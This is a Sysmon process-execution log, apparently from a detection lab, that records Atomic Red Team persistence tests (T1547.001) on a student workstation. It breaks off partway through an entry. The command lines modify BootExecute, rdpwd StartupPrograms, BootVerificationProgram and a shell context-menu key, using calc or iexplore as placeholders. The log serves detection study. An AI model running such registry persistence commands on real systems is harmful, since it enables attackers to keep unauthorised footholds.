"2025-12-26 11:19:17.894 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173638,"Cmdline: secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1584 ¦ PGUID: E9F06A57-6125-694E-9C01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.886","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.093 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173639,"Cmdline: secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7084 ¦ PGUID: E9F06A57-6126-694E-9D01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.089","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.455 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173641,"Cmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.441","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.846 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173643,"Cmdline: ""C:\WINDOWS\system32\reg.exe"" export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg /y ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7208 ¦ PGUID: E9F06A57-6126-694E-A001-000000002400 ¦ ParentPID: 1456 ¦ ParentPGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentCommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.839","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.176 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173645,"Cmdline: ""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 4676 ¦ PGUID: E9F06A57-6127-694E-A101-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.150","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.218 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173646,"Cmdline: reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd"" /f /v StartupPrograms /t REG_SZ /d ""calc"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8728 ¦ PGUID: E9F06A57-6127-694E-A301-000000002400 ¦ ParentPID: 4676 ¦ ParentPGUID: E9F06A57-6127-694E-A101-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.209","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.445 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173647,"Cmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6660 ¦ PGUID: E9F06A57-6127-694E-A401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.435","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.490 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173648,"Cmdline: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ ParentPID: 6660 ¦ ParentPGUID: E9F06A57-6127-694E-A401-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.480","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.852 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173650,"Cmdline: ""cmd.exe"" /c reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6127-694E-A701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.842","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.896 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173651,"Cmdline: reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add ""HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"" /ve /t REG_SZ /d ""C:\Windows\System32\calc.exe"" /f ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2484 ¦ PGUID: E9F06A57-6127-694E-A901-000000002400 ¦ ParentPID: 9072 ¦ ParentPGUID: E9F06A57-6127-694E-A701-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.889","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:32.155 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173661,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_525.31002.150.0_x64__cw5n1h2txyewy\WidgetBoard.exe"" -RegisterProcessAsComServer -ServerName:Microsoft.Windows.WidgetBoardServer ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 5124 ¦ PGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ ParentPID: 6932 ¦ ParentPGUID: E9F06A57-5FFE-694E-B000-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Medium ¦ OriginalFileName: msedgewebview2.exe ¦ ParentImage: C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_525.31002.150.0_x64__cw5n1h2txyewy\WidgetBoard.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:32.120","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:33.459 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173662,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=crashpad-handler --user-data-dir=C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:4 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=143.0.7499.147 ""--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --annotation=plat=Win64 ""--annotation=prod=Edge WebView2"" --annotation=ver=143.0.3650.96 --initial-client-data=0x174,0x178,0x17c,0x150,0x184,0x7fffd9ac62b8,0x7fffd9ac62c4,0x7fffd9ac62d0 ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 3796 ¦ PGUID: E9F06A57-6134-694E-AB01-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Medium ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:32.636","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:34.087 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173663,"Cmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService --lang=en-GB --service-sandbox-type=asset_store_service --video-capture-use-gpu-memory-buffer --no-pre-read-main-dll --ram-no-pressure-read-main-dll --metrics-shmem-handle=4812,i,5674824212763597977,17107012914028847136,524288 --field-trial-handle=1988,i,13279507995747332574,9132512059420465572,262144 --variations-seed-version --trace-process-track-uuid=3190708997556373682 --mojo-platform-channel-handle=796 /prefetch:14 ¦ Proc: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 7240 ¦ PGUID: E9F06A57-6136-694E-AC01-000000002400 ¦ ParentPID: 772 ¦ ParentPGUID: E9F06A57-607E-694E-4201-000000002400 ¦ Description: Microsoft Edge ¦ Product: Microsoft Edge ¦ Company: Microsoft Corporation ¦ Hashes: MD5=EEDCB91823A577336215FD725124B011,SHA256=9AFD1452D57620CC28C97C1760BB3FD195FB69D76037818EC956DE75B85771F1,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedge.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:34.066","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:34.298 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173664,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1708,i,10474877924127897006,13887593609638870929,262144 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=1788 /prefetch:2 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ Proc: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disk-cache-size=52428800 --edge-webview-enable-mojo-ipcz --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msEdgeFluentOverlayScrollbar --lang=en-GB --mojo-named-platform-channel-pipe=6932.8684.12342479633813318046 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ LID: 0x18a9d ¦ LGUID: E9F06A57-5FE2-694E-9D8A-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6136-694E-AD01-000000002400 ¦ ParentPID: 5124 ¦ ParentPGUID: E9F06A57-6134-694E-AA01-000000002400 ¦ Description: Microsoft Edge WebView2 ¦ Product: Microsoft Edge WebView2 ¦ Company: Microsoft Corporation ¦ Hashes: MD5=B3D8670A1D473BFC160824B84587CF06,SHA256=B0813B5D25A06F4F511A6151DBE5D1E6BFEEA35F4E2245DBC643C87432B9A783,IMPHASH=9ACEBDFAC77931C2B0DFBBEA2D494BA9","CurrentDirectory: C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\ ¦ FileVersion: 143.0.3650.96 ¦ IntegrityLevel: Low ¦ OriginalFileName: msedgewebview2.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:34.205","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:34.658 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",173665,"Cmdline: ""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\143.0.3650.96\msedgewebview2.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --noerrdialogs --user-data-dir=""C:\Users\student\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=WidgetBoard.exe --webview-exe-version=525.31002.100.0 --embedded-browser-webview=1 --embedded-browser-webview-dpi-awareness=2 --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=1992,i,13679267893064813625,13639262477409158142,524288 --field-trial-handle=1852,i,7930795831113620893,16739823868299927735,262144 --enable-features=msEdgeFluentOverlayScrollbar,msSingleSignOnOSForPrimaryAccountIsShared --variations-seed-version --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=1996 /prefetch:11 /pfhostedapp:14f7cef8fe56ec9622a44643b61ca02ff80e63cb ¦ Proc: C:\Program Files 